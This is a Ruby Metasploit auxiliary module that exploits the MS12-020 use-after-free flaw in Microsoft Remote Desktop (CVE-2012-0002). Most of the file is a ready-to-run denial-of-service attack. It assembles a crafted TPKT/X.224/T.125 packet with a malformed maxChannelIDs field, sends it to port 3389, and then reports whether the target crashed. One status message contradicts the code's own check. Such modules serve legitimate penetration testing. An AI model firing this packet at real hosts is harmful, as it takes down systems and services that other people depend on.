##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS12-020 Microsoft Remote Desktop Use-After-Free DoS',
      'Description'    => %q{
        This module exploits the MS12-020 RDP vulnerability originally discovered and
        reported by Luigi Auriemma.  The flaw can be found in the way the T.125
        ConnectMCSPDU packet is handled in the maxChannelIDs field, which will result
        an invalid pointer being used, therefore causing a denial-of-service condition.
      },
      'References'     =>
        [
          [ 'CVE', '2012-0002' ],
          [ 'MSB', 'MS12-020' ],
          [ 'URL', 'http://www.privatepaste.com/ffe875e04a' ],
          [ 'URL', 'http://pastie.org/private/4egcqt9nucxnsiksudy5dw' ],
          [ 'URL', 'http://pastie.org/private/feg8du0e9kfagng4rrg' ],
          [ 'URL', 'http://stratsec.blogspot.com.au/2012/03/ms12-020-vulnerability-for-breakfast.html' ],
          [ 'EDB', '18606' ],
          [ 'URL', 'https://blog.rapid7.com/2012/03/21/metasploit-update' ]
        ],
      'Author'         =>
        [
          'Luigi Auriemma',
          'Daniel Godas-Lopez',  # Entirely based on Daniel's pastie
          'Alex Ionescu',
          'jduck',
          '#ms12-020' # Freenode IRC
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Mar 16 2012"
    ))

    register_options(
      [
        Opt::RPORT(3389)
      ])
  end

  def is_rdp_up
    begin
      connect
      disconnect
      return true
    rescue Rex::ConnectionRefused
      return false
    rescue Rex::ConnectionTimeout
      return false
    end
  end

  def run
    max_channel_ids = "\x02\x01\xff"

    pkt = ''+
      "\x03\x00\x00\x13" +  # TPKT: version + length
      "\x0E\xE0\x00\x00" +  # X.224 (connection request)
      "\x00\x00\x00\x01" +
      "\x00\x08\x00\x00" +
      "\x00\x00\x00"     +
      "\x03\x00\x00\x6A" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224 (connect-initial)
      "\x7F\x65\x82\x00" +  # T.125
      "\x5E"             +
      "\x04\x01\x01"     +  # callingDomainSelector
      "\x04\x01\x01"     +  # calledDomainSelector
      "\x01\x01\xFF"     +  # upwardFlag
      "\x30\x19"         +  # targetParameters
      max_channel_ids    +  # maxChannelIds
      "\x02\x01\xFF"     +  # maxUserIds
      "\x02\x01\x00"     +  # maxTokenIds
      "\x02\x01\x01"     +  # numPriorities
      "\x02\x01\x00"     +  # minThroughput
      "\x02\x01\x01"     +  # maxHeight
      "\x02\x02\x00\x7C" +  # maxMCSPDUsize
      "\x02\x01\x02"     +  # protocolVersion
      "\x30\x19"         +  # minimumParameters
      max_channel_ids    +  # maxChannelIds
      "\x02\x01\xFF"     +  # maxUserIds
      "\x02\x01\x00"     +  # maxTokenIds
      "\x02\x01\x01"     +  # numPriorities
      "\x02\x01\x00"     +  # minThroughput
      "\x02\x01\x01"     +  # maxHeight
      "\x02\x02\x00\x7C" +  # maxMCSPDUsize
      "\x02\x01\x02"     +  # protocolVersion
      "\x30\x19"         +  # maximumParameters
      max_channel_ids    +  # maxChannelIds
      "\x02\x01\xFF"     +  # maxUserIds
      "\x02\x01\x00"     +  # maxTokenIds
      "\x02\x01\x01"     +  # numPriorities
      "\x02\x01\x00"     +  # minThroughput
      "\x02\x01\x01"     +  # maxHeight
      "\x02\x02\x00\x7C" +  # maxMCSPDUsize
      "\x02\x01\x02"     +  # protocolVersion
      "\x04\x82\x00\x00" +  # userData
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x0C" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x38\x00\x06\x03" +  # T.125
      "\xF0"             +
      "\x03\x00\x00\x09" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x21\x80"            # T.125

    unless is_rdp_up
      print_error("#{rhost}:#{rport} - RDP Service Unreachable")
      return
    end

    connect
    print_status("#{rhost}:#{rport} - Sending #{self.name}")
    sock.put(pkt)
    Rex.sleep(3)
    disconnect
    print_status("#{rhost}:#{rport} - #{pkt.length.to_s} bytes sent")

    print_status("#{rhost}:#{rport} - Checking RDP status...")

    if is_rdp_up
      print_error("#{rhost}:#{rport} - RDP Service Unreachable")
      return
    else
      print_good("#{rhost}:#{rport} seems down")
      report_vuln({
        :host => rhost,
        :port => rport,
        :name => self.name,
        :refs => self.references,
        :info => "Module #{self.fullname} successfully crashed the target system via RDP"
      })
    end

  end
end
